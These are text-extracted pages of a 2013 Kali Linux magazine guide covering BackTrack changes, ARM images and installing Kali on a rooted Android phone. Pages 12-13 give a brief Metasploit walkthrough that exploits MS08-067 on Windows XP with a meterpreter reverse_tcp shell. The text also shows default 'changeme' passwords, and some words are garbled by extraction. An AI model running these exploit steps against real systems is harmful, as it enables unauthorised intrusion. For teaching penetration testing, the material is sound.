              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 6}, page_content='www.hakin9.org/en 7Kali Linux – What’s new?\\nand users can easily find the location of installed \\nfiles such as binaries and libraries. This will also \\nlead to a more stable system in general.\\nIn BackTrack, every pen-test tool which you \\nwanted to use you either had to express the full \\npathname to the tool e.g. /pentest/passwords/\\nrainbowcrack/rcrack  or change to the directory in \\norder to use it. Kali no longer uses the  /pentest  di-\\nrectory tree, and all command line pen-test tools \\nseem to be located in /usr/bin . Pen-test tools are now in PATH and can now be fired up from any -\\nwhere in the system. I certainly don’t miss the /\\npentest  directory. This certainly makes life a whole \\nlot easier.\\nNo Nessus\\nNessus does not come installed with Kali and is \\nnot available in the Kali repositories. One reason \\nfor this could be that Kali linux is based on Debi -\\nan Wheezy (Debian 7), however if you check the \\navailable downloads from the tenable website, \\nthey have only released a version of Nessus for \\nversion 6 of Debian. Another reason for this may \\nbe because Nessus is more of an audit and com -\\npliance benchmarking tool than a pen-test tool, \\nand perhaps it was thought too bloated to include. \\nNessus is certainly something I see more of in -\\nstalled on dedicated servers these days. Howev -\\ner if you want to install it, the Debian 6 version of \\nNessus which can be downloaded from the ten -\\nable website will still work. The only other pos -\\nsible reason for not including Nessus is that Nes -\\nsus is forbidden in the Penetration Testing with \\nBackTrack(PWB) Course (which will probably \\nadvertisement\\nListing 1.  How to install Firefox\\necho “deb http ://downloads .sourceforge .net/\\nproject/ubuntuzilla /mozilla/apt all main” \\n>> /etc/apt/sources.list\\napt-get remove iceweasel\\napt-key adv –recv -keys –keyserver \\nkeyserver .ubuntu.com C1289A29\\napt-get update\\napt-get install irefox -mozilla-build\\napt-get install thunderbird -mozilla-\\nbuild\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 7}, page_content='Extra 03/2013 8BASICS\\nget a new name now because of Kali). Offensive \\nSecurity encourages all of its PWB students to \\nuse more specialised and targeted tools to per -\\nform enumeration and discovery. Further, differ -\\nent tools quite often output different results, so it’s \\nbest to use more highly targeted tools in a pen-\\ntest to get specific results rather than the results \\nof a generalised scan or vulnerability assessment \\ntool such as Nessus.\\nOther Notable Changes\\nKali uses Leafpad instead of gedit which is a much \\nlighter weight text editor than gedit. It is also no -\\nticeably faster. But if you want to use gedit it is \\nstill available in the Kali respository with a simple \\napt-get install gedit.  Gedit may appear bloated to \\nsome unless you are interested in syntax highlight -\\ning. Personally I like syntax highlighting, but have \\na habit of writing all my code in vim from the ter -\\nminal window which has this functionality anyway \\n– each to their own I guess. Here’s a list of some \\nother welcome changes:\\n•  The PDF viewer which was used in BackTrack \\nhas now been replaced with Document Viewer \\nwhich is great since I found the PDF viewer a \\nbit lakey.\\n•  You can now easily create your own custom \\nISO of Kali by using Debian live-build scripts.\\n•  Kali comes with VLC player pre-installed which \\nwas not included in BackTrack.\\n•  I’ve also noticed that the ISO image for Kali is \\nalmost 1GB smaller than the BackTrack 5 R3 \\nISO.\\nUpgrading to Future versions of Kali\\nIf you had BackTrack 4 installed and wanted to up -\\ngrade to BackTrack 5, the only way you could have \\nachieved this was to do an entire reinstall. This \\nwould be time consuming, and mean you would \\nhave to re-configure everything back to the way \\nyou wanted it, and customise all your tools again. \\nWith Kali however, an upgrade to future major re -\\nleases can be done by simply issuing the following \\ncommands: Listing 2.\\nThe Kali repository gets its security packages \\nfrom the Debian repository, and all of its tools are \\nnow packaged up to be Debian compliant. \\nListing 2.  Upgrading Kali to the next major distribution\\nroot@kali :~# apt-get update\\nroot@kali :~# apt-get dist-upgradeSummary\\nIn summary, Kali linux feels a lot smoother to \\nwork with than BackTrack, whilst most of the \\ntools remain fairly similar or unchanged; the \\nmain overhaul to be commended on is the over -\\nall improvement in the quality of the distribution \\nfrom the move to Debian. It now feels like a com -\\nplete distribution with far less flakiness and a lot \\nmore stability. For a duck dive into the pen-test \\ntools which ship with Kali, I would recommend \\ndoing Offensive Security’s Penetration Testing \\nwith BackTrack(PWB) course which will familiar -\\nise you with all the tools necessary to conducting \\na complete penetration test with reporting. The \\nmain advantage you will notice is that the tools \\nare now all in path with Kali. The only advice I \\nhave in pursuing this course is to get permission \\nfrom your other half, as it will take a good couple \\nof months out of your life, but is extremely fun, ad -\\ndictive, and rewarding with all the breakthroughs \\nyou will have. Well done to the Offensive Security \\nTeam for creating such an improved distribution, \\nand good luck with your Kali experience.\\nSTeveN MCLAUgHLIN  \\nSteven McLaughlin is an experienced in -\\nformation and network security profes -\\nsional. With both a technical and consult -\\ning background, he has been heavily in -\\nvolved in working with global companies \\ndeveloping solutions and delivering large \\nscale projects. He also works in highly spe -\\ncialized teams in order to develop new ideas and patents and \\nbring new products to market.\\nOn the Web\\n•  http://www.pathname.com/fhs/  – Information on \\nFile Hierarchy Standard\\n•  http://www.ofensive-security.com/information-securi -\\nty-training/penetration-testing-with-backtrack/  – Pen -\\netration Testing with Backtrack Course\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 8}, page_content=''),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 9}, page_content='Extra 03/2013 10BASICS\\nKali Linux is the latest linux distribution made \\nfor penetration testing by and used by secu -\\nrity assessors and hackers. Kali Linux is al-\\nso considered as a successor to Backtrack. Back -\\ntrack was based on Ubuntu Distribution ( www.\\nubuntu.com ) whereas Kali Linux complies with \\ndebian development standards ( www.debian.org ).\\nBuilding Kali Linux was something like Re-In -\\nventing the wheel again. Kali Linux was built from \\nscratch, to support under the Debian platform and \\nalso to make it compatible with new or existing se -curity tools. Kali Linux is designed to support both \\n32-bit and 64-bit platform and ARM Architecture. \\nevolution of Kali Linux\\nWhen Backtrack was initially developed by Offen -\\nsive-Security, with consideration in mind to con -\\nduct network based Vulnerability Assessment and \\nPenetration testing. They started releasing BT ver -\\nsions with their name, as depicted on (Figure1). \\nWhen BT 3 was released, it was released with \\ncodename “Whydah” and added functionality and \\ntools to conduct wireless testing. BT 4 released \\nwith Codename “ Pwnsauce ” and “ Nemisis ”, with \\nadded functionality of web application testing and \\nwith more advanced and improved GUI based in -\\nterface. And with continuation to BT 5 R2 with se -\\ncurity tools update like BeeF(Browser Explotation \\nFrwamework), bluelog, dnschef, dpscan, etc.\\nKali Linux is considered an enterprise ready solu -\\ntion, because it considered enterprise users when \\nit was designed. Kali runs on a Debian platform, \\nwhich supports many software repositories to keep \\nupdating OS with latest releases and patch. This \\ncapability reduces updating problem, which users \\nwere facing on BT environment.\\nAlso Offensive security team up with Rapid 7 \\n(Makers of Metasploit Framework), to provide offi -\\ncial support to Kali Linux. So MSF ( most important ar -\\nsenal of BT ) was rebuildt to support Debian platform.KALI Linux  \\nFor enterprises\\nWhenever we think of Penetration Testing (PT) the first \\nname that comes to our mind is “Backtrack (BT)” , which we \\nhave been using for the last few years. Backtrack, funded \\nby offensive Security (www.offensive –Security.com), is also \\none of the most popular UBUNTU Linux based platform, \\nwith collection of organized security testing tools such \\nas Open-VAS, maltigo, Metasploit Framework (MSF), etc. \\nLast release to Backtrack series was Backtrack 5 R2 with \\ncodename Revolution.\\nFigure 1. Evolution of Kali Linux\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 10}, page_content='www.hakin9.org/en 11KALI Linux (For enterprises)\\nDevelopment Architecture\\nKali Linux supports various Reduced Instruction \\nset Computing  (RISC) based development archi -\\ntecture. Kali ARM can be made for:\\n•  EikaMX\\n•  Beaglebone Black\\n•  CuBOX\\n•  Galaxy Note 10.1\\n•  Samsung Chromebook\\n•  MK/SS808\\n•  ODROID U2\\n•  Raspberry Pi\\n•  ARM Chroot\\nLet’s discuss here few of them, how these ARM’s \\ncan be used for Kali Linux.\\neikaMX\\nEfika is a line of power efficient ARM architecture and \\nPower architecture. EfiKa MX Open Client is a net -\\nwork computer based around the EFIKA MX micro-\\nmother board. EfikaMX has following specifications:\\n•  Freescale i.MX515 (ARM Cortex-A8 800MHz)\\n•  3D Graphics Processing Unit\\n•  512 MB RAM\\n•  8GB USB\\n•  2x USB 2.0 ports\\n•  Audio jacks for headset\\n•  Built in Speaker\\n•  Bluetooth (Broadom 2043) \\nSteps to build image by EikaMX\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali image\\n•  Step 3: use dd utility to image this ile to SD card \\nroot@kali:~ dd if =kali-1.0.1-eimx.img of=/dev/sdb \\nbs=512k\\nBeaglebone Black\\nBeaglebone boards are tiny computers with all ca -\\npability of today’s desktop machine without bulk \\nnoise, expense or noise.\\nSteps to build image using Beaglebone:\\n•  Step 1: Get 8GB micro SD Card, class 10 high -\\nly recommended\\n•  Step 2: Download Kali Linux Beaglebone\\n•  Step 3: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =kali-bbb.img of=/dev/sdb bs=512kSamsumg galaxy Note 10.1\\nOf course the popular one and most people have \\nit. Also attract pentesters to build image for this. \\nKali also listed down its procedure to make image \\nfor Galaxy note 10.1. Galaxy note 10.1 has follow -\\ning specification:\\n•  1.4 GHz Quacore processor\\n•  2 GB RAM\\nSteps to build image for Samsung Note (Steps as \\nper Kali Linux.org website)\\n•  Step 1: Get 8GB micro SD Card\\n•  Step 2: Root the Samsung Galaxy Note 10.1\\n•  Step 3: Download Kali Linux for Samsung gal -\\naxy Note 10.1\\n•  Step 4: Rename the image to linux.img\\n•  Step 5: Download Recover.img ile from down -\\nload section of Kali Linux.orf and copy it on \\nyour Note 10.1 sdcard\\n•  Step 6: use dd utility to image this ile to SD card\\nroot@kali:~ dd if =/dev/block/mmcblk0p6 \\nof=recovery.img_orig\\n•  Step 7: Reboot Galaxy  note 10.1 to recovery \\nmode , press Power Off  and Volume UP  button. \\nOnce you see the text for “Samsung Galaxy \\nNote 10.1”, release the power button but keep \\npressing the Volume UP button.  This should \\nboot into Kali and auto Login into Gnome. Root \\nPassword is “Changeme”\\n•  Step 8: Open Keyboad: Applications -> Univer -\\nsal Access -> Florence Virtual Keyboard\\nNote: development architecture referenced from \\nhttp://docs.kali.org/category/armel-armhf .\\nDirectory Structure\\nAs Kali is successor to Backtrack, so most of its fea -\\ntures are inherited from backtrack. Like Backtrack,  \\nFigure 2.  Directory Structure\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 11}, page_content='Extra 03/2013 12BASICS\\nKali tools are also divided into 12 categories (Fig -\\nure 2):\\n•  Information Gathering\\n•  Vulnerability Analysis\\n•  Web Applications\\n•  Password Attacks\\n•  Wireless Attacks\\n•  Stress Testing\\n•  Exploitation Tools\\n•  Snifing/Snooping \\n•  Maintaining Access•  Reverse Engineering\\n•  Forensics\\n•  Reporting Tools\\nRemembering Backtrack 5, penetration direc -\\ntories are organized in under /pentest  directory. \\nBut in Kali Linux doesn’t store security tools un -\\nder pentest directory, commands are generally ex -\\necuted from /usr/sbin (Figure 3).\\nAnother important category of tools added in Kali \\nLinux are “TOP 10 Security Tools” which are fre -\\nquently used by pentesters, as presented Figure 4. \\nOffensive security has also put lots of effort to \\nmake Kali enterprise ready solution by adding \\nmore tools in Kali. Researchers most of the time \\nused backtrack for “MSF” and to do other stuff, \\nthey depend on other penetration testing distro’s \\nor they make their OWN ISO or install on their own \\noperating system. (Figure 4) shows the compari -\\nson between Backtrack and Kali (Figure 5).\\nFigure 4.  Kali Linux “Top 10 Security Tools”\\nFigure 3.  Kali Vs. Backtrack: Change in Directory Structure\\nFigure 5.  Tool Comparison between Kali and Backtrack\\nFigure 6.  Opening metaspoloit with msfconsole command\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 12}, page_content='www.hakin9.org/en 13KALI Linux (For enterprises)\\nLet’s do some Practical things with Kali\\nAs we know the famous vulnerability in Windows-\\nXP “MS08-067: Vulnerability in Server Service \\ncould allow Remote-Code execution” \\nSome Brief about the vulnerability\\nRemote code execution vulnerability exists in the Serv -\\ner service on Windows systems. The vulnerability is due to the service not properly handling specially crafted \\nRPC requests. An attacker who successfully exploited \\nthis vulnerability could take complete control of an af -\\nfected system .\\nReference to the vulnerability\\nhttp://technet.microsoft.com/en-us/security/bulle -\\ntin/ms08-067 .\\nSystem exploited successfully\\nWindows XP Service PACK-2.\\nSteps followed to exploit the vulnerability (Figures \\n6-9). Steps explained in a nutshell.\\nStep 1: Open MSF Console\\nmsfconsole\\nFigure 7. Searching exploits for netapi\\nFigure 8.  Setting up exploit, adding required variables, and exploiting the target\\nFigure 9.  Verifying exploited system\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 13}, page_content='Extra 03/2013 14BASICS\\nStep 2: Search for exploit “netapi”, \\nuse command “search netapi”\\nStep 3: Configure the exploit for execution to \\ntarget\\nUse following commands to exploit target\\n•  Use exploit/windows/smb/ms08_067_netapi\\n•  Set payload windows/meterpreter/reverse_tcp\\n•  Set lhost <your machine IP>\\n•  Set rhost <Remote IP>\\n•  exploit\\nStep 4: exploit run Successfully, Run vNC\\nKali Linux installation and Software \\nrepositories\\nInstallation\\n•  Download VMPlayer or VMware workstation \\nfrom Vmware website as per yours operating \\nsystem\\n•  Install on the VMPlayer or VMWare on your \\nplatform\\n•  Create Virtual machine (With min 20 GB Hard \\ndisk Space, 1GB RAM, Two Network Adapter, \\nrest all by default)\\n•  Mount KALI ISO ile on the VMWARE setting\\n•  Switch on the Virtual machine and boot it from \\n“CD-ROM” by pressing “ESC”\\n•  Once GRUB Appear, and then click on the in -\\nstall (or it can be used as a LIVE CD)\\n•  Follow the instruction as written on screen \\n(Similar to backtrack installation)\\n•  Finish the installation\\nUpdate Kali\\n•  Open leafpad•  Open ile from /etc/apt/sources.list  (Some \\nsources path already present there, but more \\ncan be added from Google)\\n•  apt-get update\\n•  apt-get upgrade\\n•  apt-get dist-upgrade\\nSummary\\nKali Linux a Debian based platform for advanced \\npenetration testing. Kali approach is good try for \\nstepping ahead into next generation of penetration \\ntesting. Researchers and developers of offensive \\nsecurity have put their best effort to make Kali plat -\\nform enterprise ready. As Debian being the older \\nplatform for Linux, it also has a large user base \\ncompared to UBUNTU. Debian based Operating \\nsystem has also good market capture so move -\\nment from Ubuntu to Debian platform will definitely \\ngive power to end users. \\nAt last KALI is enterprise focused, developed \\nkeeping in mind enterprise needs, so there is much \\nmore to evolve in near future. So good luck to Of -\\nfensive Security team!\\nKeep Learning and Be Secure!\\nNAvNeeT SHARMA\\nNavneet Sharma is a Solution Architect \\nwith Tata consultancy services, working in \\ndomain of information security and net -\\nwork security. He holds a degree of Bache -\\nlor of Technology in Information Technol -\\nogy and has worked in diverse range of in -\\ndustry verticals over the last 7 years of his \\ncareer. Some key assignment that he has been involved in in -\\nclude network security design and consulting, security audit -\\ning (Application/Network), Vulnerability Assessment and Pen -\\netration Testing.\\nReferences\\n•  http://en.wikipedia.org/wiki/BackTrack  – for Backtrack in a NutShell\\n•  http://www.ofensive-security.com/tag/kali-linux/  – for all post on Kali Linux about installation and managing\\n•  http://www.kali.org/  – for introduction to Kali\\n•  http://docs.kali.org/category/armel-armhf  – for Kali Linux ARM Architecture also for creating ARM image s on Eika -\\nMX, Beaglebone etc.\\n•  http://www.backtrack-linux.org/backtrack/backtrack-5-r2-r eleased/  – For Oicial introductory release of Backtrack 5\\n•  http://www.h-online.com/open/news/item/Kali-Linux-arrives -as-enterprise-ready-version-of-BackTrack-1822241.html  \\n– For Story behind building Kali Linux for enterprises\\n•  http://www.ofensive-security.com/kali-distribution/kali-l inux-on-galaxy-note/  – For deeper look of Kali Linux instal -\\nlation on Galaxy Note\\n•  https://wiki.debian.org/EikaMX#What_is_EikaMX.3F  – For Introduction of EFIKAMX chipset\\n•  http://www.infosecisland.com/blogview/22236-Backtrack-5-r3 -List-of-Some-of-the-New-Tools-and-Programs.html  – \\nFor introduction to new tools added to BackTrack\\n•  http://www.beagleboard.org  – Introduction to BeagleBone Chipset and it’s working\\n•  http://www.backtrack-linux.org/  – All about BackTrack and it’s feature.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 14}, page_content='A BZ Media Event  \\nBig Data TechCon™is a trademark of BZ Media LLC.“Big Data TechCon is loaded with great networking \\nopportunities and has a good mix of classes with te chnical\\ndepth, as well as overviews. It’s a good, technical ly-focused\\nconference for developers.”\\n—Kim Palko, Principal Product Manager, Red Hat\\n“Big Data TechCon is great for beginners as well as \\nadvanced Big Data practitioners. It’s a great conference!”\\n—Ryan Wood, Software Systems Analyst, Government of Canada\\n“If you’re in or about to get into Big Data, this is the \\nconference to go to.”\\n—Jimmy Chung, Manager, Reports Development, AvectraDiscover how to master Big Data from real-world practitioners – instructors \\nwho work in the trenches and can teach you from real-world experience!Big Data gets real \\natBig Data TechCon!\\nSan Francisco\\nOctober 15- 17, 2013\\nwww.BigDataTechCon.com• Collect, sort and store massive quantities\\nof structured and unstructured data\\n• Process real-time data pouring into\\nyour organization\\n• Master Big Data tools and technologies\\nlike Hadoop, Map/Reduce, NoSQL \\ndatabases, and more• Learn HOW TO integrate data-collection \\ntechnologies with analysis and \\nbusiness-analysis tools to produce \\nthe kind of workable information\\nand reports your  organization needs\\n• Understand HOW TO leverage Big Data \\nto help your organization todayOver 60how-to \\npractical classes\\nand tutorials \\nto choose\\nfrom!\\nThe HOW-TO conference for Big Data and IT professionalsCome to Big Data TechCon to learn the best ways to:'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 15}, page_content='Extra 03/2013 16AT TACK\\nThe global market is flooded, ruled by android-\\nbased mobile devices and smartphones. \\nMobile phones are becoming smaller and \\nhave greater processing power. These devic -\\nes with mobile internet and wireless connectivity \\nhave revolutionised businesses and work method -\\nologies. Tasks like connectivity, sharing, process \\nautomation and extensive computing over smart -\\nphones have become the norm. The android oper -\\nating system has made smartphones and mobile \\ndevices, a very powerful tool in the hands of secu -\\nrity professionals and even deadlier in the hands \\nof black hats.\\nAndroid is a very popular operating system for \\nmobile devices such as smartphones and tablets. \\nInitially developed by Android Inc. and then bought \\nby Google in 2005. Android is an Open Handset \\nAlliance product and released under the Apache \\nlicense. The power of Android platform lies in the \\nthousands of apps running on it, backed by a strong \\nand active open source developer community. Used \\nby 70% of the mobile developer community, thus making it the most widely used platform. It is con -\\nsidered a highly customisable and scalable mobile-\\nbased distribution, making it widely accepted foun -\\ndation base for community-driven mobile projects. \\nAndroid Architecture Overview \\nAndroid devices, built on Linux kernel version 2.6 \\nand the first commercially distribution made avail -\\nable on HTC Dream handset in 2008. Since then \\nnumerous updates have incrementally improved \\nthe operating system base and added new and \\nimproved functionality. The latest official release \\nis Jelly Bean 4.3 with a slogan „An even sweet -\\ner Jelly Bean”. Android’s user interface uses touch \\ninputs to correspond to real world actions. These \\nresponses are immediate, with vibrations and hap -\\ntic feedback capabilities. The Android framework is \\nvery extensive as it has a layered approach. It has \\nfive layers, the kernel and low-level tools, the na -\\ntive libraries, the android runtime with Dalvik virtual \\nmachine, the framework layer is on top of this and \\nfinally the applications run above everything. Weaponization of \\nAndroid Platform using \\nKali Linux\\nKali Linux has become the most popular tool for \\nprofessional penetration testing and security auditing. \\nIn this article, we will review how to couple the \\nfunctionality of Kali Linux with Android platform \\nover HTC One X smartphone to create an invincible \\npenetration-testing weapon.\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 16}, page_content='www.hakin9.org/en 17Weaponization of Android Platform  using Kali Linux \\nThe Linux kernel is written in C/C++ and the \\nframework is written in java and runs on Dalvik vir -\\ntual machine. The present kernel is 3.0.x and has \\nadded support for Bluetooth and Wi-Fi encryption. \\nAndroid is built to run on devices with little main \\nmemory and low powered CPU’s. Majority of the \\nmodules are made to consume low power. The ac -\\ntual android runtime consists of Dalvik virtual ma -\\nchine and java libraries. All applications in android \\ndevices run in their own sandboxed Dalvik virtu -\\nal machines. Each applications runs with its own \\nunique user id and in its own process. Android has \\nvery efficient memory and power management. \\nAndroid has support for various APIs, has media \\nframework, integrated internet browser support, \\nhighly optimised graphics, camera, GPS, compass, \\nand accelerometer sensors. The applications can \\nbe easily created using SDKs and are available \\nusing the various apps markets. The biggest ap -\\nps market is Google Play where one can find vari -\\nous apps in categories and using searches. Apart \\nfrom the default Google Play, there are many oth -\\ner app stores to download and install apps. Table \\n01 provides a list of widely used open markets, but \\nmake sure not to trust anyone blindly in the present \\nscenarios of malicious apps and malware threats. \\nAlways disable USB debugging and uncheck the \\n“Unknown sources” option under Settings >> Ap -plications menu to keep your android device safe \\nfrom such tampering (Figure and Table 1).\\nTable 1. List of available Android App Stores\\nSl # Apps Market Url\\n01 Google Play https://play.google.com/store?hl=en\\n02 Amazon store http://www.amazon.com/mobile-\\napps/b?node=2350149011\\n03 GetJar http://www.getjar.mobi/\\n04 Slide ME http://slideme.org/\\n05 F-Droid https://f-droid.org/\\n06 Appoke http://beta.appoke.com/\\n07 Appia http://appia.com/\\n08 App Brain http://www.appbrain.com/\\n09 Android Pit http://www.androidpit.com/\\n10 Handango http://www.handango.com/Home.\\njsp?siteId=2218\\n11 Handster http://www.handster.com/\\n12 Mobango http://in.mobango.com/\\n13 Opera Store http://apps.opera.com/en_in/\\n14 Soc.io http://soc.io/\\n15 Insyde Market http://www.insydemarket.com/\\n16 AppsFire http://appsire.com/\\n17 Aptoide http://www.aptoide.com/\\nFigure 1.  Android Architecture, taken from wiki\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 17}, page_content='Extra 03/2013 18AT TACK\\nIntroduction to the HTC One X Mobile \\nPhone\\nThe HTC One X smartphone is a pretty power -\\nful device with 1.5 GHz, quad core (global ver -\\nsion) CPU speed, Android 4.1 with smart sense \\n4, screen size of 1280x720 (HD, 720p) with 1GB \\nRAM 16/24 GB Flash Memory and Wi-Fi, Blue -\\ntooth, NFC, USB connectivity and multi-sensors \\n(Gyro sensor, G-Sensor, Digital Compass, Proxim -\\nity sensor and Ambient light sensor).\\nIntroduction to Kali Linux\\nOffensive Security the creators of Backtrack Linux \\nhave a new catchy tag line “the quitter you become, \\nthe more you are able to hear”, with this Zen man -\\ntra the focus is stealth. Kali Linux was created for \\nstealth and attack, this amazing distribution is an \\nadvanced and more versatile version of Backtrack \\never created. This distribution is geared towards \\nprofessional penetration testers and security audi -\\ntors. Kali has gone beyond any live cd distro and \\nmoved into the category of a full-fledged operat -\\ning system. It has moved to a solid base of Debi -\\nan modules and is completely File Hierarchy Sys -\\ntem (FHS) compliant. All directories appear under \\nthe main root directory “/”, and have the ability to \\nbe stored and accessed on physical or virtual de -\\nvices. The main “/pentest” directory from previous \\nBacktrack5 release has been removed in this ver -\\nsion named Kali. Now the user can execute any tool \\nfrom anywhere in the file-system, irrespective of its \\ninstalled location. The second advantage of Kali is \\nits support for ARM hardware and ability to boot -\\nstrap the installation directly from the repositories. \\nKali operating system has over three hundred \\npenetration testing tools and wireless device sup -\\nport. Its kernel is highly patched and network \\nservices are disabled by default making it more \\nsecure. Kali is not just for network security profes -\\nsionals, beginners can also start learning about \\ncyber security using this distribution. Whether you \\nare pentesting wireless, exposing server vulner -\\nabilities, performing a web application based ex -\\nploit, learning, or doing social engineering, Kali is \\nthe one-stop-shop for all security needs. Kali is \\nfree and now ported on Android based smartphone \\nto be taken anywhere.\\nKali Linux has many well-known tools like \\nMetasploit, Injection capable wireless drivers, Kis -\\nmet, John, Zap Proxy, Nmap, Ophcrack, Ettercap, \\nHydra, etc. These tools are all categorised in fif -\\nteen different categories for various purposes. The \\nfifteen categories are: Top 10 Security Tools, In -\\nformation Gathering, Vulnerability Analysis, Web \\nApplications, Password Attacks, Wireless Attacks, Exploitation Tools, Sniffing/Spoofing, Maintain -\\ning Access, Reverse Engineering, Stress Testing, \\nHardware Hacking, Forensics, Reporting Tools \\nand System Services. Kali Linux is running Debian \\nXFCE and comes with vim as default text editor. \\nAll the standard applications and accessories are \\npre-installed and ready to run. For weaponizing \\nAndroid platform with Kali Linux, we will require an \\nunlocked & rooted device.\\nHow to unlock the HTC One X Bootloader \\nand Root the device?\\nIt is important to understand the difference be -\\ntween Unlocking the Bootloader and rooting mo -\\nbile devices. Unlocking the Bootloader provides \\nthe user with the option to change the stock oper -\\nating system on the mobile device. However, root -\\ning is the process of modifying or altering the de -\\nfault operating system shipped with the device to \\ngain complete control over it. \\nThis means that the limitations of carriers and \\nvarious manufacturers put on the device is eas -\\nily bypassed, extended functionality is accessed \\nwithout any problems, custom modules and up -\\ngrades can be added without any limitations. Gen -\\nerally, manufacturers and carriers do not usually  \\nFigure 3.  Warranty Void\\nFigure 2.  Unlock Bootloader\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 18}, page_content='www.hakin9.org/en 19Weaponization of Android Platform  using Kali Linux \\nrecommend rooting. HTC provides instructions on \\ntheir website to unlock the Bootloader for HTC One \\nX, but by performing this operation, the user voids \\nall warranty on the device. The systematic instruc -\\ntions to unlock the Bootloader for HTC One X are \\npresent on the HTC Dev site. Make sure HTC Driv -\\ners are installed on the PC and the mobile phone \\ncan connect and be recognised as HTC Device \\nvia USB cable. Once the device gets connected \\nsuccessfully to the PC, login to the HTCDev web -\\nsite with the registered user name and password. \\nStart by selecting Unlocking Your Bootloader and \\nthen select “All Other Supported Models” under \\nthe Supported Devices section, click Begin Unlock \\nBootloader to start the wizard.\\nThe website prompts to sign a disclaimer that \\nclearly states, the warranty is void and proceed -\\ning further would mean that every repair would be \\ncharged. The website wizard finishes by request -\\ning the device Token ID extracted from the mobile \\nphone. Then based on the Token ID, HTC releases \\nthe unlock code block to release the mobile de -\\nvice. The “unlock.bin” file received is, used to flash \\nthe device and the Bootloader gets unlocked. Next \\nstep is to install SuperSu app, which is an access \\nmanagement tool. Now with root privilege on the \\nmobile device, Kali Linux can be installed. There \\nare two methods to install Kali Linux on Android:\\n•  Method 01: Install Kali GUI using Linux Deploy \\nApp,\\n•  Method 02: Install Kali Command Line Inter -\\nface (CLI) using Chroot Environment.\\nMethod 01: Install Kali gUI using Linux \\nDeploy App\\nRequirements : Rooted HTC One X mobile with 4GB \\nfree space, Linux Deploy App & Android VNC Viewer.\\nMethodology\\n•  Install Linux Deploy and conigure \\nthese values: Distribution=Kali Linux , \\nArchitecture=armel , VNC: Screen Width=1920 , VNC: \\nScreen Height=1280 , (Figure 4-6)\\n•  Scroll up click Install  to inish the download and \\ninstall of Kali Linux over Wi-Fi,\\n•  After completion, go back to the Settings and \\nselect Reconigure  option,\\n•  Once reconiguration is complete, run the serv -\\ner using the START  option,\\n•  Install Android VNC-Viewer and conigure \\nthese values: Nickname=Kali , Set Port=5900 , \\nPassword=changeme , Color Options = 4bpp better \\nquality video  (Figure 7-9).\\nFigure 4.  Linux Deploy\\nFigure 6.  Install inish\\nFigure 5.  Click Install\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/Guide_To_Kali_Linux_pdf.pdf', 'page': 19}, page_content='Extra 03/2013 20AT TACK\\nClick on the Connect button to ire away. Ka -\\nli Linux GUI will show up. This method effectively \\nshows to deploy Kali GUI over Android.\\nOptional 01\\nKali distribution can be updated by running the be -\\nlow command from a terminal prompt:\\nsudo apt-get update && sudo apt-get upgrade && \\nmsfupdate\\nOptional 02\\nArmitage tool can also be added. Armitage is a \\nscriptable tool for Metasploit that visualizes tar -\\ngets, recommends exploits and exposes the ad -\\nvanced post-exploitation features in the Metasploit \\nframework. It has many features for discovery, \\naccess, post-exploitation, and manoeuvre, which \\nmakes is more effective. The command to install \\nArmitage is:\\napt-cache search armitage && apt-get install \\narmitage\\nMethod 02: Install Kali Command Line \\nInterface (CLI) using Chroot environment\\nIn this method the chroot operation is used to deploy \\nKali Linux. The chroot operation changes the root \\ndirectory for the current running processes and its \\nchildren processes by creating and hosting a sepa -\\nrate virtualised environment. Any program deployed \\nusing this operation is confined to the defined base \\ndirectory. Here the chroot operation is used to setup \\nthe Kali Linux platform for pentesting.\\nRequirements\\nRooted HTC One X mobile device with 6GB free \\nspace, BusyBox free app & Terminal Emulator app.\\nMethodology\\n•  Download pre-compiled chroot kali distribution \\nfrom http://googl/qmGle . Mirror: https://archive.\\norg/details/Kali.nogui.armel.zitstif.chroot.482013\\n MD5: d60c5a52bcea35834daecb860bd8a5c7\\n SHA1: f62c2633d214de9edad1842c9209f443bcea385d\\n•  Extract the downloaded archive onto phone’s \\ninternal storage folder /sdcard/kali ,\\n•  Kali folder contains three iles, hashsum, ‘kali’ \\nshell script and ‘kali.img’ ile (Figure 10),\\n•  Install Terminal Emulator app.To run the Kali \\nchroot environment use the below command:\\n Figure 9.  Kali Linux booting\\nFigure 8.  VNC-Viewer\\nFigure 7.  Server started\\nFigure 10.  Extracted folder containing kali.img\\n'),\n",
